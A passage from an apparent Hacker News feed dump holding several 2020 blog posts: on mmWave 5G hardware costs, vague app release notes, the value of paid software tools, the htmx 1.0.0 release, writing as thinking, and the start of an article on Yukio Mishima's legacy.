<p>mmWave phones have multiple RF antenna modules designed to improve signal reception – a complex task without a doubt. Each of these has its own amplification, power management and transceiver. This complexity adds to the cost of hardware and results in a factor of <a href="https://benchmarking.ihsmarkit.com/614670/the-first-5g-phone-in-the-united-states-is-a-compromise-of-cost-and-design-ihs-markit-says" target="_blank" rel="noreferrer noopener">three times higher</a> relative to the average 4G smartphone.</p>



<p><a href=""></a>What about testing mmWave phones on the manufacturing floor? As mentioned earlier, most of our wireless communication systems have been operating below 2 GHz. Even when you consider Wi-Fi, we don’t get any higher than 6 GHz. There are a number of RF testing products such as <a href="https://amzn.to/3fg0luz">spectrum analyzers </a>and <a href="https://amzn.to/2UFEG5N">signal generators</a> that operate up to 6 GHz. They are not very expensive. 5G mmWave however requires test equipment that has to cover 40 GHz at least. Such equipment can cost as much as $100,000 or more. Not very affordable at all.</p>



<h2><strong>Summary</strong></h2>



<p>In this post we have talked about some of the RF challenges that we need to overcome to make mmWave 5G a success. We provided an overview of about three broad areas: RF propagation, Phone hardware and Development costs. The challenges in each of these areas are very daunting but exciting at the same time.</p>



<p><a href="https://www.onesdr.com/2020/09/27/how-to-measure-5g-radiation/">Read our post on how to measure 5G radiation</a></p>



<figure><img loading="lazy" width="1024" height="146" src="https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2-1024x146.png" alt="Mailing List" srcset="https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2-1024x146.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2-300x43.png 300w, https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2-768x110.png 768w, https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2-1536x220.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/02/mailing-list-2.png 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



	<div data-blog-id="171021735">
		<div>
			<form aria-describedby="wp-block-jetpack-mailchimp_consent-text">
				
												

				<p id="wp-block-jetpack-mailchimp_consent-text">
					<br>_________________________________________________<br>Icons made by&nbsp;<a href="https://www.flaticon.com/authors/freepik" target="_blank" rel="noreferrer noopener">Freepik</a>&nbsp;from&nbsp;<a href="https://www.flaticon.com/" target="_blank" rel="noreferrer noopener">www.flaticon.com</a> 				</p>

				
			</form>
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	











		</div></div>]]>
            </description>
            <link>https://www.onesdr.com/2020/11/19/mmwave-vs-sub-6-ghz-5g-whats-the-difference/#more-1996</link>
            <guid isPermaLink="false">hacker-news-small-sites-25233982</guid>
            <pubDate>Sat, 28 Nov 2020 00:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bullshit Release Notes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25233944">thread link</a>) | @neilpanchal
<br/>
November 27, 2020 | https://neil.computer/notes/bullshit-release-notes/ | <a href="https://web.archive.org/web/*/https://neil.computer/notes/bullshit-release-notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
<header>
    
</header>
        <!--Display single note. This template is dispatched by post.hbs-->
<main>
        <article>
        <h2>Bullshit Release Notes</h2>
        <figure><img src="https://neil.computer/content/images/2020/11/slack-update.png" alt="Recent Slack Update - Release Notes" srcset="https://neil.computer/content/images/size/w600/2020/11/slack-update.png 600w, https://neil.computer/content/images/size/w1000/2020/11/slack-update.png 1000w, https://neil.computer/content/images/size/w1600/2020/11/slack-update.png 1600w, https://neil.computer/content/images/2020/11/slack-update.png 1844w" sizes="(min-width: 720px) 720px"><figcaption>Recent Slack Update - Release Notes</figcaption></figure><blockquote>We've tinkered with the internal workings and polished some rough edges. The app is now better than it was.</blockquote><p>How about actually telling us what changed? This is a common practice in already hostile iOS and macOS App stores.</p><p>One or more of the following is true:</p><ul><li>Developers who build these apps are lazy and negligent</li><li>Lawyers have advised not to publish release notes with updates as a way to protect the company from liability</li><li>We must &nbsp;hide "technical" information that might overwhelm our users</li></ul><p>First one, I do not believe can be true. Developers generally want to keep track of what they did and they would already have this information in their PRs/repos. </p><p>Second, I think this is plausible but then again, the EULA says you can't sue the company for breaking something.</p><p>Third - this is the most likely reason. Why are we treating the general public like they're too afraid of complexity? It's not like the release notes make people nervous or fatigued. It is <em>optional</em> to read. It's tucked away.</p><p>I've had a number of paid apps that have gone downhill since and are no longer usable. They've incrementally degraded the experience <em>without informing the user. </em>I am left with a tough choice - never update the app or take a chance.</p><p>This practice needs to stop, I don't see why release notes cannot be part of a massive publicly traded company and the software being used by millions of people.</p>
        </article>
</main>
<p>
    <a href="https://neil.computer/">← Back to Home</a>
</p>

    


    

</div>]]>
            </description>
            <link>https://neil.computer/notes/bullshit-release-notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25233944</guid>
            <pubDate>Sat, 28 Nov 2020 00:31:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Need to Spend More Money on Software Tools]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25232888">thread link</a>) | @gestures
<br/>
November 27, 2020 | https://sourcelevel.io/blog/why-you-need-to-spend-more-money-on-software-tools | <a href="https://web.archive.org/web/*/https://sourcelevel.io/blog/why-you-need-to-spend-more-money-on-software-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
						<p><img width="1024" height="683" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752-1024x683.jpg" alt="A keyboard, mouse and coffe mug on a table." loading="lazy" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752-1024x683.jpg 1024w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752-300x200.jpg 300w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752-768x512.jpg 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752-1536x1024.jpg 1536w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/pexels-toni-cuenca-585752.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px">						</p>
						
						
<p><em>“Should I buy this or not?”</em> Ever since the invention of money (and even before that), this very sensible question accompanies our buying decision. And of course not only for cars, handbags, and trampolines – but also when it comes to buying <strong>software tools</strong>.</p>



<p>I’m no expert when it comes to cars, handbags, and trampolines – but as the CEO and founder of “<a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower</a>” (a desktop GUI for the Git version control system), I have both opinions and some expertise when it comes to SaaS software tools. Of course, my background in a small software company means that I’m highly biased in this matter! But I want to invite you to consider if my <em>arguments</em> might be true, independent of my own bias.</p>



<h2>The ROI of Software Tools is Almost Always Fantastic</h2>



<p>Here is my bold statement: in many cases, <strong>the return on investment is fantastic when it comes to software tools you use for your work</strong>. Let me tell you why I am so convinced that this is true.</p>



<h2>The Benefits of Good Software Tools</h2>



<p>Great software tools come with a host of benefits:</p>



<ol><li><strong>They make you more productive.</strong> For your private purposes, it might be enough if you keep track of tasks you have to do in a simple text file (or even on a piece of paper). But when it comes to your professional work – and especially in a team context – these overly simplistic solutions just won’t cut it. In our team, we are using “<a href="https://www.asana.com/">Asana</a>” to keep track of tasks and projects. And it would be so much harder and cost so much more time if we tried to do this manually! The same logic is true for a tool like “<a href="https://sourcelevel.io/">SourceLevel</a>“: instead of manually pulling together data from various sources, it helps you get a thorough overview of your Pull Request and Code Review metrics quicker and with less effort. <em>Not</em> using these tools – with the intention of trying to save a few bucks – very quickly backfires when it impairs your productivity (and more importantly: the productivity of your whole team)!</li><li><strong>They allow you to do things you couldn’t do without them.</strong> Our own product is a perfect example for this statement: <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower, the Git desktop GUI</a> that we make, helps developers to access advanced features of the Git version control system – which, due to the high complexity and steep learning curve of Git, they wouldn’t be able to use (or wouldn’t even be aware of) without Tower. Many software developers claim to know Git. But when it comes to more advanced features like Interactive Rebase, Submodules, or the Reflog, they either don’t know/ don’t use them – or they simply can’t use them efficiently. Anyone who has ever performed an Interactive Rebase operation, with its many manual steps, quickly comes to love Tower, where the same operation is possible via simple drag and drop!</li><li><strong>They reduce mistakes.</strong> I can vividly remember the stress and the anxiety I used to feel when I had to update our website: I would connect to our live server with an FTP program and replace some files with updated versions. This is the equivalent of open heart surgery, which means that a fair amount of stress is not surprising: there are a lot of things that can go wrong and cause a real mess! This whole scenario, for us, lies many years in the past and looks very different from how we do things today: for our marketing websites, we’re using a service called “<a href="https://deploybot.com/">Deploybot</a>” that makes this process a lot easier. And to run the build process for our main Tower app, we’re using the popular “<a href="https://travis-ci.org/">Travis CI</a>” service. Using both of these services (instead of doing things manually) has greatly reduced our error rate – and thereby saved us lots of hours of putting out fires.</li><li><strong>They free your time for more important work.</strong> As the CEO of a small tech company, my schedule is naturally pretty busy. And as anyone knows who has ever tried to find time on <em>multiple</em> people’s calendars: this is really time consuming work! Offering multiple alternative dates that block your calendar for days, looping in multiple people in multiple time zones, and all the back-and-forth emailing connected with this make these things a true nightmare. This is why I’m happily paying a hundred bucks for a yearly subscription of “<a href="https://calendly.com/">Calendly</a>” In a nutshell, this service allows me to share my availability and leave it to the other party / parties to pick a date and time that’s convenient for them. This completely takes away all of the ugly back-and-forth! And on top of that, it allows the other party to choose very freely and conveniently. This has freed up hours of my time that I can now use for more important work!</li></ol>



<hr>



<p>It’s hard to put a concrete dollar value to the above benefits. But if you think <em>any</em> of them through, you will quickly see that many software tools are a true bargain – they make you more productive, allow you to do things you couldn’t do without them, reduce mistakes, and free your time for more important work. All of this makes for a terribly great return on investment!</p>



<h2>Common Objections</h2>



<p>Let’s not ignore the haters, doubters, and nay-sayers and address some common objections.</p>



<blockquote><p>“It’s too expensive!”</p></blockquote>



<p>Let’s take our own tool, the “Tower” Git GUI, as an example.</p>



<ul><li>A license costs between 69 and 99 USD per user per year.</li><li>Our customers are professional software developers in companies large and small as well as freelance programmers.</li><li>The value that Tower delivers is that it makes software developers more productive: it helps them reduce mistakes and get access to the more advanced features that allow them to produce higher-quality software.</li></ul>



<p>The average software developer’s salary varies wildly, but it’s somewhere between 40,000 and 150,000 USD per year. The math here is very simple: if such a tool can help a developer save just <em>a couple of minutes</em> or prevent <em>just 1-2 errors</em> every month – by adding a meager 69 USD to that 40,000 USD yearly cost – the software tool has already paid for itself!</p>



<p>The same argument holds true for almost <em>any</em> knowledge worker: compared to the salaries of well-educated people, the costs of most software tools are extremely low, almost negligible. This means that they earn back their money very quickly! Either in productivity or any of the other benefits that I mentioned above.</p>



<blockquote><p>“I don’t need a tool for that.”</p></blockquote>



<p>It’s true: you <em>can</em> skin a potato with your bare hands and fingernails. But it’s just not very efficient. One reason why humankind has flourished over the millennia is because we have the ability to invent tools. And a potato peeler isn’t very different from a software tool like Tower: you’ll be more productive and get a better end result when using it!</p>



<p>I don’t doubt that you <em>can</em> do lots of things manually, without using a tool. But think carefully if, at least in some cases, there’s a chance that a tool could make things <em>easier</em> and <em>more productive</em>.</p>



<blockquote><p>“The free alternative is sufficient for me.”</p></blockquote>



<p>While you usually have to <em>pay</em> for a potato peeler, software tools are <em>sometimes</em> free: they might be Open Source, or a programmer’s hobby project, or they’re sponsored by a large corporation.</p>



<p>In some cases, such a free piece of software might indeed be an excellent choice (very often the case with Open Source projects). But more often than not, “free” will come with a price tag. Let’s take <strong>quality</strong> as an example: often, quality is not on par with paid alternatives. Why? Because quality costs an immense amount of time and money which both have to come from somewhere! Other examples are non-existent customer support or the lack of good documentation. All of these things, just like the overall “quality” aspect, cost time and money which are often not available in the case of free software.</p>



<blockquote><p>“My boss won’t pay for this.”</p></blockquote>



<p>Dear managers: I hope that reading this far has convinced you that it makes a ton of sense to cover expenses for software tools. If they make your employees just a tiny bit more productive – or if they make their lives a little bit easier – then covering expenses for tools should be a no-brainer. After all, <strong>our job as managers is to provide the people in our teams with everything they need to do good, productive work</strong>.</p>



<h2>A Look at Our Own “Household Spending”</h2>



<p>I started this post by admitting that I’m terribly biased: as CEO of a small software company, it’s probably no surprise that I encourage people to buy <em>our</em> software. However, I’m quite confident that I went beyond <em>our own</em> product and proved that the ROI of software tools <em>in general</em> is often very good.</p>



<p>To prove that we really “walk the walk” (and not just “talk the talk”), here’s an overview of the tools that we spend our own, hard-earned money on:</p>



<figure><img loading="lazy" width="686" height="1024" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png" alt="" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png 686w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-201x300.png 201w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-768x1146.png 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools.png 842w" sizes="(max-width: 686px) 100vw, 686px"><figcaption>Software Tools Overtable</figcaption></figure>



<h2>It Goes Without Saying: Spend Wisely!</h2>



<p>Of course, all of the above does NOT mean that you should just spend, spend, spend! 💵 Like in other areas of life, you shouldn’t give in to every impulse and just buy any software tool that you come across.</p>



<p>But when it comes to <em>tools for your work</em>, I encourage you to keep your eyes just as much on the “return” part as on the “investment” of the “Return on Investment” consideration. <strong>Don’t hesitate to buy software that brings value!</strong> If it helps you and your team do your jobs better – in a more productive, easier, or safer way – then investing is probably much more clever than being overly frugal.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/4ce5f09c24954f13334bd193ffe522ee?s=100&amp;d=blank&amp;r=r" srcset="https://secure.gravatar.com/avatar/4ce5f09c24954f13334bd193ffe522ee?s=200&amp;d=blank&amp;r=r 2x" height="100" width="100" itemprop="image" loading="lazy"></p><div><p>Tobias Günther is the CEO of <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools" target="_blank" rel="noopener noreferrer" data-token-index="2" data-reactroot="">Tower</a>, the popular Git desktop client that helps more than 100,000 developers around the world to be more productive with Git.</p></div></div>						
						
						
					</div></div>]]>
            </description>
            <link>https://sourcelevel.io/blog/why-you-need-to-spend-more-money-on-software-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232888</guid>
            <pubDate>Fri, 27 Nov 2020 21:51:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.0.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 51 (<a href="https://news.ycombinator.com/item?id=25232719">thread link</a>) | @skept
<br/>
November 27, 2020 | https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.0.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.0.0/">1.0.0 release</a> of htmx.</p>
<p>htmx is now mature enough that I can recommend it as a general replacement for intercooler.js
projects.  I <strong>don't</strong> think there is a strong reason to port an existing intercooler project to
htmx.  I have several large intercooler apps and will not be moving them over any time soon. I can, however, recommend using htmx over intercooler for new projects.</p>
<p>htmx is a different sort of javascript library.  It is an HTML &amp; hypertext-oriented reply to the current dominance of javascript-based SPA libraries.  It is a response to Tom MacWright's question:
<a href="https://macwright.com/2020/10/28/if-not-spas.html">"If not SPAs, What?"</a>.</p>
<p>As the <a href="https://htmx.org/">homepage says</a>:</p>
<ul>
<li>Why should only <code>&lt;a&gt;</code> and <code>&lt;form&gt;</code> be able to make HTTP requests?</li>
<li>Why should only <code>click</code> &amp; <code>submit</code> events trigger them?</li>
<li>Why should only GET &amp; POST be available?</li>
<li>Why should you only be able to replace the entire screen?</li>
</ul>
<p>HTML-oriented web development was abandoned not because hypertext was a bad idea, but rather because HTML didn't have sufficient expressive power.  htmx aims to fix that &amp; allows you to implement <a href="https://htmx.org/examples/">many common modern web UI patterns</a> using the original hypertext model of the web.</p>
<h3>History &amp; Thanks</h3>
<p>htmx began life as <a href="https://intercoolerjs.org/">intercooler.js</a> back in <a href="https://github.com/bigskysoftware/intercooler-js/commit/62d3dbdb5c056ee866aba3575e148de649fc3efe">2013</a>.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/commit/e38dea64dd1065003a0e833d7b469d24e6bc2919">april</a> of this year I began work on a jQuery-indepenent &amp; improved version of intercoolerjs, renamed
to htmx.  I chose to rename the library because, in working on intercooler, I had come to appreciate that intercooler &amp; htmx were completing HTML as a hypertext rather than just some funky, idiosyncratic javascript libraries.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/releases/tag/v0.0.1">May</a> htmx reached 0.0.1.  Soon thereafter I had the good fortune of being contacted by <a href="https://twitter.com/ben_pylo">Ben Croker</a>
who was interested in htmx as a base for his new reactive library, <a href="https://putyourlightson.com/plugins/sprig">Sprig</a>.  Ben was willing to be an early adopter of htmx and pushed the library along
much faster than it would have gone otherwise.</p>
<p>I have been very lucky to the have help and feedback from many contributors in <a href="https://github.com/bigskysoftware/htmx/graphs/contributors">Github</a> and on <a href="https://htmx.org/discord">Discord</a>.  I'd like to thank, in particular, <a href="https://github.com/benpate">Ben Pate</a>, <a href="https://github.com/rschroll">Robert Schroll</a> &amp; <a href="https://github.com/jreviews">Alejandro Schmeichler</a> for contributing code as well as new ideas and discussions.</p>
<p>I would like to thank <a href="https://devmode.fm/">Devmode.fm</a> for having me on to <a href="https://devmode.fm/episodes/dynamic-html-with-htmx">talk about htmx</a> and for cleaning up all my "uhhs" and "umms".</p>
<p>Finally, I would like to thank <a href="https://github.com/jsampson">Justin Sampson</a>, who took a lot of time to explain REST &amp; HATEOAS to me and how intercooler (and now htmx) fit into that model for web development.</p>
<h3>Changes</h3>
<ul>
<li>I bumped the version number :)</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232719</guid>
            <pubDate>Fri, 27 Nov 2020 21:27:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Purpose of Writing]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25232512">thread link</a>) | @s3v
<br/>
November 27, 2020 | https://limitlesscuriosity.com/the-purpose-of-writing/ | <a href="https://web.archive.org/web/*/https://limitlesscuriosity.com/the-purpose-of-writing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <h2 id="i">I</h2><p>I, like many other people, have discovered that it is almost impossible to think seriously without writing. Writing clarifies and sharpens your thoughts in a way that is superior to merely articulating them in a conversation. It allows you to look at your ideas more objectively, almost as if they were from another person. You can then examine them and think about if what you have written down is really true.</p><p>However, more often than discovering that your ideas are wrong, you will discover something different: that you do not know what you think. Sure, you have some vague idea, and you believe that there is a chain of reasoning that leads to a certain conclusion. But what you will discover is that this chain of reasoning is mostly not existent. At best, it has many holes and maybe leads not where you think it does. This discovery is, of course, very unpleasant and sometimes even painful. In a sense, you have lied to yourself by thinking you have thought through this specific topic when, in reality, you have only copied the opinion of someone else.</p><p>This process requires an immense amount of honesty because nobody likes to feel stupid. Either you do not know what you think, in which case you feel stupid. Or it turns out that what you believed to be your opinion does not really make sense, is logically inconsistent, and mostly copied from someone else, in which case you feel stupid as well. However, the reward for all this exhausting work is clarity and simplicity. You now possess a chain of reasoning where you have looked as carefully as you can for holes and problems. The next step is to let others examine your reasoning—publishing.</p><h2 id="ii">II</h2><p>I am happy when others enjoy my work and when I can offer a new perspective, but for me, the criticism of my ideas is the most rewarding part of publishing. This is why I recently wrote:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Don't write to criticize others; write to be criticized by others.</p>— Sven Schnieders (@SvenSchnieders) <a href="https://twitter.com/SvenSchnieders/status/1303074445003812864?ref_src=twsrc%5Etfw">September 7, 2020</a></blockquote>

</figure><p>If you care about being less wrong tomorrow than you are today, you have to take this extreme attitude towards criticism. It will show in your writings and in the way you express your ideas. If you want to be perceived as smart and right, you will articulate your ideas in a moderate way so that others agree with it. (This is one of the main problems I have with contemporary intellectuals who always seem to take the middle ground.) If you are searching for truth, you will articulate the most extreme and radical consequences of your ideas, precisely because others will disagree with them and tell you where your ideas are wrong.</p><p>A good example is a discussion about the distribution of intelligence (not IQ) that I often have with my dad. To crudely summarize the discussion: he believes most people are too stupid to understand complex ideas; for him, this even applies to people who do not recognize the importance of free speech (the real free speech without the “but”). On the other hand, I think that the difference between people’s minds is mostly quantitative (speed and memory) and that almost everyone can understand complex ideas if they take the time and put in the effort; for me, this even applies to, e.g., quantum mechanics.</p><p>I do not want to get into the discussion (that’s a different essay, and it is more nuanced than I portrayed it here), but note how radically different our positions are. It is because we both put forward the most extreme consequence of our theories. If he or I cared about finding a consensus and about looking correct, we could have used different examples: he could have said that people cannot understand complex systems like capitalism, and I could have said that people are capable of understanding even classical physics.</p><p>Notice that the disagreement looks way less severe using these examples. Some people might even argue that understanding how capitalism works is more difficult than understanding classical physics. It feels as if we are way closer to a compromise or to finding a common ground. But in reality, were are just further away from finding the truth because our disagreement is not as clear and obvious as it could be, which leads to worse criticism.</p><h2 id="iii">III</h2><p>This way of expressing ideas can sometimes be perceived as rude because, in contrast to most other people, you are not searching for consensus but for the truth. However, it is not a form of arrogance to express the most extreme consequences of your ideas; it is a form of intellectual honesty. In this way, your ideas are widely open to criticism, and you are therefore more likely to learn something. You are also more likely to look stupid, but that is a price you must be willing to pay.</p><h2 id="iv">IV</h2><p>The inherent fuzziness of conversations makes it difficult to notice gaps in your understanding and reasoning. This applies both to your conversation partner and to yourself.</p><p>Having a conversation with someone else about your ideas is only superior to writing about them under two conditions. First, if you have already thought about your ideas on the topic a lot and have carefully examined your chain of reasoning, which, as I have already explained, is best done in writing. And second, if the other person is smart, has thought about the topic a lot as well, and values truth over consensus. If, and only if, both of these conditions are met, a conversation can be more fruitful in sharpening your ideas than writing about them. There are other advantages to conversations with regards to creativity, thought-provoking impulses, and inspiration, but for thinking deeply about a topic, writing is superior to a conversation.</p><h2 id="v">V</h2><p>Anyone who reads books that are commonly known as <em>the classics</em> will be somewhat discouraged from publishing their writing because these people were so smart. Every idea you come up with has probably been expressed better by someone else (most likely even by Plato because, as some say, <a href="https://www.age-of-the-sage.org/philosophy/footnotes_plato.html">all of western philosophy is merely a series of footnotes to his works</a>). Put differently by Allen Farrington:</p><blockquote>“The classics are classic because those people were a lot smarter than us and we kinda wish they were still around telling the rest of us idiots what to do.”</blockquote><p>Although I whole hardheartedly agree with this sentiment and might one day decide to write up my thoughts on why I think we are “stupider” than our ancestors, it does not have to be demotivating. In fact, it is quite the opposite. Recognizing that our contemporary intellectuals are, let’s just say, “not up for the task” should be a motivation for everyone else. I think the question,</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Have the smart people always been this stupid?</p>— Heather E Heying (@HeatherEHeying) <a href="https://twitter.com/HeatherEHeying/status/1327124783365021696?ref_src=twsrc%5Etfw">November 13, 2020</a></blockquote>

</figure><p>should be answered with a resounding no. We are standing on the shoulders of giants, being mostly unworthy of the great works of the past. But it does not mean that we cannot make ourselves worthy. You (and I) may not possess the courage of Nietzsche or the wisdom of Plato, but it is our responsibility to breathe new life into their thoughts—to think them further—and since they are not around, there is no point in being discouraged.</p><h2 id="vi">VI</h2><p>Do not compare yourself to the classics; they are dead and cannot solve our problems for us. If you need confidence, compare yourself to contemporary intellectuals, and you will see that society needs all the help it can get. Remember, “<a href="https://en.wiktionary.org/wiki/in_the_land_of_the_blind,_the_one-eyed_man_is_king">in the land of the blind, the one-eyed man is king,</a>” and one thing is certain: there are very few two-eyed men left.</p><p>Every time I get disappointed in my ability to think and articulate my thoughts, which happens frequently, I look at contemporary intellectuals and remember Bukowski’s words:</p><blockquote>“I had to continue because they were so bad, not because I was so good; and I’m still not so good, but they’re still very bad.”</blockquote><h2 id="vii">VII</h2><p>This essay is my way of saying: Start writing! You will learn as much about the topic as about yourself. You will be shocked by how often you trick yourself into falsely thinking that you have understood something. You will write and think, “Oh, is this why I think that? I didn’t know that.” </p><p>The process is exciting, challenging, scary, and sometimes painful, but above all, it is worth it. And one day, you and I might be able to read the great works of the past and feel that we have honored their achievements by keeping their ideas alive, and maybe we have even managed to think some of them further.</p><p>Thank you for reading my essay.</p>
                </div></div>]]>
            </description>
            <link>https://limitlesscuriosity.com/the-purpose-of-writing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232512</guid>
            <pubDate>Fri, 27 Nov 2020 20:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mishima in the Twenty First Century]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 33 (<a href="https://news.ycombinator.com/item?id=25232488">thread link</a>) | @overwhelm
<br/>
November 27, 2020 | http://www.petertasker.asia/articles/mishima-in-the-twenty-first-century/ | <a href="https://web.archive.org/web/*/http://www.petertasker.asia/articles/mishima-in-the-twenty-first-century/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<p>Published in <a href="https://asia.nikkei.com/Editor-s-Picks/Tea-Leaves/Yukio-Mishima-in-the-21st-century" target="_blank">Nikkei Asia 23/11/2020</a></p>
<p>Can you imagine best-selling novelist Haruki Murakami leading a coup attempt against Japanese Prime Minister Yoshihide Suga? Or Booker Prize winner Ian McEwan taking a top general hostage in a British army base and inciting a rebellion against Boris Johnson’s government? Or any of the legions of writers and artists who regularly hammered President Donald Trump on social media choosing to die for their cause?</p>
<p>Probably not, but that would be the modern equivalent of what happened on Nov. 25, 1970, when the brilliant Japanese novelist Yukio Mishima and four accomplices invaded the office of the commander of Japan’s Self-Defense Forces, called on his troops to topple the government of Prime Minister Eisaku Sato, and then committed <em>seppuku</em>, or ritual disembowelment (vulgarly known as <em>hara-kiri</em>).<a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg" alt="NARMishima" width="460" height="612" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-768x1022.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-395x525.jpg 395w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-436x580.jpg 436w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg 1503w" sizes="(max-width: 460px) 100vw, 460px"></a></p>
<p>Mishima had been nominated three times for the Nobel Prize for Literature, but he was not just a writer. He was a major celebrity in Japan, the first to be described as a <em>supasuta</em> (superstar) by the media, and one of the best-known Japanese writers abroad. In the late 1960s the magazine <em>Heibon Punch</em> nominated him the “coolest male” in Japan in its “Mr. Dandy” awards, ahead of movie star Toshiro Mifune and baseball hero Shigeo Nagashima.</p>
<p>Since his shocking suicide, establishment Japan has preferred not to dwell on the “Mishima incident,” and only ultra-rightwing groups have seemed happy to mark the various anniversaries of his death. For the 50th anniversary, though, the vibe has been different. A few days ago, I managed to catch <em>Mishima: The Last Debate</em>, a documentary that uses recently discovered footage of a face-off between Mishima and hundreds of radical students during violent street protests in 1969.</p>
<p>The film was released in March, but was still screening in Tokyo’s central Shibuya district. I half-expected the audience to be dominated by elderly rightists in combat gear. I was wrong. There were women in their 20s and 30s wearing designer masks, some students, ordinary looking couples and solitary intellectual types. Although the film was advertised as a tense confrontation between violence-prone right and violence left-wing groups, the debate was mostly respectful on both sides, with Mishima’s wit drawing gales of laughter from the students and, indeed, the cinema audience.</p>
<p>Other films about Mishima have been made this century. The late Koji Wakamatsu, a radical left sympathizer once known as the “Kurosawa of pink [erotic] movies,” directed <em>11.25: The Day He Chose His Own Fate</em>&nbsp;(2012). This biopic offers a straightforward factual account of Mishima’s last months. There is also a film version of <em>Spring Snow</em>, the first and best volume in his <em>Sea of Fertility</em>&nbsp;tetralogy.</p>
<p>His books are still popular too. Mishima wrote intense, heavyweight novels conveying his philosophical ideas, but also less serious fare as entertainments for the mass market. Interestingly it is the latter that have been doing particularly well these days. A light novel called <em>Yukio Mishima’s Letter Writing Class</em>&nbsp;has consistently ranked in Amazon Japan’s Top 10 for Japanese literature. &nbsp;Another entertainment called <em>Life for Sale</em>&nbsp;was the top seller of 2016 in the Japanese literature department of Kinokuniya, Japan’s largest bookshop, with total sales topping 250,000.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg" alt="Mishima display at Maruzen bookshop (photo: Giles Murray)" width="460" height="345" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-768x576.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-700x525.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-773x580.jpg 773w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima display at Maruzen bookshop (photo: Giles Murray)
